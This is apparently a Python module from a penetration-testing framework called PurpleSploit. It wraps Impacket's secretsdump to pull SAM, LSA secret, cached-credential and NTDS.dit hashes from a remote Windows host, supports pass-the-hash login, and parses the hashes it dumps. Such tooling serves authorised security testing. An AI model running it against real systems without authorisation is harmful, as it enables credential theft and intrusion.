"""
Impacket SecretsDump Module

Dump credentials from Windows systems.
"""

from purplesploit.core.module import ExternalToolModule


class ImpacketSecretsDumpModule(ExternalToolModule):
    """
    Impacket SecretsDump - Credential dumping tool.

    Dumps SAM, LSA secrets, cached credentials, and NTDS.dit hashes.
    """

    def __init__(self, framework):
        super().__init__(framework)
        self.tool_name = "impacket-secretsdump"

    @property
    def name(self) -> str:
        return "Impacket SecretsDump"

    @property
    def description(self) -> str:
        return "Dump SAM, LSA, cached credentials, and NTDS.dit hashes"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "impacket"

    def _init_options(self):
        """Initialize module-specific options."""
        super()._init_options()

        self.options.update({
            "RHOST": {
                "value": None,
                "required": True,
                "description": "Target host IP address",
                "default": None
            },
            "USERNAME": {
                "value": None,
                "required": True,
                "description": "Username for authentication",
                "default": None
            },
            "PASSWORD": {
                "value": None,
                "required": False,
                "description": "Password for authentication",
                "default": None
            },
            "DOMAIN": {
                "value": ".",
                "required": False,
                "description": "Domain name (use '.' for local)",
                "default": "."
            },
            "HASH": {
                "value": None,
                "required": False,
                "description": "NTLM hash (LM:NT format)",
                "default": None
            },
            "SAM": {
                "value": "true",
                "required": False,
                "description": "Dump SAM hashes",
                "default": "true"
            },
            "LSA": {
                "value": "true",
                "required": False,
                "description": "Dump LSA secrets",
                "default": "true"
            },
            "NTDS": {
                "value": "false",
                "required": False,
                "description": "Dump NTDS.dit (requires DC)",
                "default": "false"
            },
            "HISTORY": {
                "value": "false",
                "required": False,
                "description": "Dump password history",
                "default": "false"
            },
            "OUTPUT_FILE": {
                "value": None,
                "required": False,
                "description": "Output file prefix",
                "default": None
            }
        })

    def build_command(self) -> str:
        """
        Build the impacket-secretsdump command.

        Returns:
            Command string to execute
        """
        rhost = self.get_option("RHOST")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        domain = self.get_option("DOMAIN")
        hash_val = self.get_option("HASH")
        output_file = self.get_option("OUTPUT_FILE")

        # Build target string
        if hash_val:
            # Hash authentication
            target = f"{domain}/{username}@{rhost} -hashes {hash_val}"
        elif password:
            # Password authentication
            target = f"{domain}/{username}:{password}@{rhost}"
        else:
            # No authentication
            target = f"{domain}/{username}@{rhost}"

        # Base command
        cmd = f"impacket-secretsdump {target}"

        # Options
        sam = self.get_option("SAM")
        lsa = self.get_option("LSA")
        ntds = self.get_option("NTDS")
        history = self.get_option("HISTORY")

        # By default, dumps SAM and LSA
        # For NTDS, need -just-dc flag
        if ntds and ntds.lower() == "true":
            cmd += " -just-dc"

        if history and history.lower() == "true":
            cmd += " -history"

        # Output file
        if output_file:
            cmd += f" -outputfile {output_file}"

        return cmd

    def parse_output(self, output: str) -> dict:
        """
        Parse secretsdump output.

        Args:
            output: Command stdout

        Returns:
            Parsed results dictionary
        """
        results = {
            "success": False,
            "sam_hashes": [],
            "lsa_secrets": [],
            "ntds_hashes": [],
            "total_hashes": 0,
        }

        # Parse output
        in_sam = False
        in_lsa = False
        in_ntds = False

        for line in output.split('\n'):
            line = line.strip()

            # Section markers
            if "[*] Dumping SAM hashes" in line:
                in_sam = True
                in_lsa = False
                in_ntds = False
                results["success"] = True
            elif "[*] Dumping LSA Secrets" in line:
                in_sam = False
                in_lsa = True
                in_ntds = False
            elif "[*] Dumping Domain Credentials" in line or "NTDS" in line:
                in_sam = False
                in_lsa = False
                in_ntds = True

            # Parse hashes
            if ":" in line and len(line.split(":")) >= 3:
                if in_sam:
                    results["sam_hashes"].append(line)
                    results["total_hashes"] += 1
                elif in_lsa:
                    results["lsa_secrets"].append(line)
                elif in_ntds:
                    results["ntds_hashes"].append(line)
                    results["total_hashes"] += 1

        return results
